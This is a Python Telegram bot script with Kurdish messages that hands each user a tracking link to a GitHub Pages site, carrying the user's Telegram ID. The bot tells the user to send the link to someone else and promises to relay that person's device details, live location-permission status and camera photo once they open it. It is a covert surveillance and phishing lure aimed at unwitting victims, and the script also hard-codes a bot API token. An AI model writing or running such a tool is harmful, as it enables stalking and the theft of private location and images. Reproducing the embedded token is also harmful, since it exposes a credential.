import os
import random
import string
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY"
BASE_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    
    # دروستکردنی لینکی ڕاستەوخۆ بە IDی بەکارهێنەر
    link = f"{BASE_URL}?ref={random_str}&id={user_id}"

    text = (
        "بەخێربێیت!\n\n"
        "🔗 **لینکی تایبەتی تۆ ئامادەیە:**\n\n"
        f"{link}\n\n"
        "داواکاری: ئەم لینکە کۆپی بکە و بنێرە بۆ کەسی بەرامبەر.\n"
        "کاتێک کەسەکە بە وێبگەڕ (Chrome / Safari / Edge) لینکەکە دەکاتەوە:\n"
        "1. دەستبەجێ زانیارییە سەرەتاییەکانی بۆت دێت.\n"
        "2. دۆخی ڕێگەپێدانی Location (ئایا Allow یان Deny کراوە) سات بە سات بۆت دێت.\n"
        "3. دۆخی ڕێگەپێدانی Camera و وێنەکەی ڕاستەوخۆ بۆت دێت."
    )

    await update.message.reply_text(text, disable_web_page_preview=True)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("بۆتەکە چالاک بوو...")
    app.run_polling()

if __name__ == "__main__":
    main()
